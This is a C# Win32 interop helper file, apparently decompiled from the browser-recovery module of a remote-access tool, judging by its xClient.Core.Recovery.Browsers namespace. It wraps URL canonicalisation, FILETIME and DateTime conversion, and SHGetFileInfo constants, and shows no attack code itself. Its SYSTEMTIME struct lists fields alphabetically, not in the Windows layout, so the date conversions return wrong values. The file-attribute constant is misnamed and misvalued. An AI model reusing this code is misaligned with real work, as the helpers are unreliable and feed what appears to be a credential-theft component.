using System;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;

namespace xClient.Core.Recovery.Browsers;

public class Win32api
{
	[Flags]
	public enum shlwapi_URL : uint
	{
		URL_DONT_SIMPLIFY = 0x8000000u,
		URL_ESCAPE_PERCENT = 0x1000u,
		URL_ESCAPE_SPACES_ONLY = 0x4000000u,
		URL_ESCAPE_UNSAFE = 0x20000000u,
		URL_PLUGGABLE_PROTOCOL = 0x40000000u,
		URL_UNESCAPE = 0x10000000u
	}

	public struct SYSTEMTIME
	{
		public short Day;

		public short DayOfWeek;

		public short Hour;

		public short Milliseconds;

		public short Minute;

		public short Month;

		public short Second;

		public short Year;
	}

	public const uint SHGFI_ATTR_SPECIFIED = 131072u;

	public const uint SHGFI_ATTRIBUTES = 2048u;

	public const uint SHGFI_PIDL = 8u;

	public const uint SHGFI_DISPLAYNAME = 512u;

	public const uint SHGFI_USEFILEATTRIBUTES = 16u;

	public const uint FILE_ATTRIBUTRE_NORMAL = 16384u;

	public const uint SHGFI_EXETYPE = 8192u;

	public const uint SHGFI_SYSICONINDEX = 16384u;

	public const uint ILC_COLORDDB = 1u;

	public const uint ILC_MASK = 0u;

	public const uint ILD_TRANSPARENT = 1u;

	public const uint SHGFI_ICON = 256u;

	public const uint SHGFI_LARGEICON = 0u;

	public const uint SHGFI_SHELLICONSIZE = 4u;

	public const uint SHGFI_SMALLICON = 1u;

	public const uint SHGFI_TYPENAME = 1024u;

	public const uint SHGFI_ICONLOCATION = 4096u;

	[DllImport("shlwapi.dll")]
	public static extern int UrlCanonicalize(string pszUrl, StringBuilder pszCanonicalized, ref int pcchCanonicalized, shlwapi_URL dwFlags);

	public static string CannonializeURL(string pszUrl, shlwapi_URL dwFlags)
	{
		StringBuilder stringBuilder = new StringBuilder(260);
		int pcchCanonicalized = stringBuilder.Capacity;
		if (UrlCanonicalize(pszUrl, stringBuilder, ref pcchCanonicalized, dwFlags) == 0)
		{
			return stringBuilder.ToString();
		}
		stringBuilder.Capacity = pcchCanonicalized;
		UrlCanonicalize(pszUrl, stringBuilder, ref pcchCanonicalized, dwFlags);
		return stringBuilder.ToString();
	}

	[DllImport("Kernel32.dll", CharSet = CharSet.Auto)]
	private static extern bool FileTimeToSystemTime(ref FILETIME FileTime, ref SYSTEMTIME SystemTime);

	public static DateTime FileTimeToDateTime(FILETIME filetime)
	{
		SYSTEMTIME SystemTime = default(SYSTEMTIME);
		FileTimeToSystemTime(ref filetime, ref SystemTime);
		try
		{
			return new DateTime(SystemTime.Year, SystemTime.Month, SystemTime.Day, SystemTime.Hour, SystemTime.Minute, SystemTime.Second, SystemTime.Milliseconds);
		}
		catch (Exception)
		{
			return DateTime.Now;
		}
	}

	[DllImport("Kernel32.dll", CharSet = CharSet.Auto)]
	private static extern bool SystemTimeToFileTime([In] ref SYSTEMTIME lpSystemTime, out FILETIME lpFileTime);

	public static FILETIME DateTimeToFileTime(DateTime datetime)
	{
		SYSTEMTIME lpSystemTime = default(SYSTEMTIME);
		lpSystemTime.Year = (short)datetime.Year;
		lpSystemTime.Month = (short)datetime.Month;
		lpSystemTime.Day = (short)datetime.Day;
		lpSystemTime.Hour = (short)datetime.Hour;
		lpSystemTime.Minute = (short)datetime.Minute;
		lpSystemTime.Second = (short)datetime.Second;
		lpSystemTime.Milliseconds = (short)datetime.Millisecond;
		SystemTimeToFileTime(ref lpSystemTime, out var lpFileTime);
		return lpFileTime;
	}

	[DllImport("Kernel32.dll")]
	public static extern int CompareFileTime([In] ref FILETIME lpFileTime1, [In] ref FILETIME lpFileTime2);

	[DllImport("shell32.dll")]
	public static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbSizeFileInfo, uint uFlags);
}
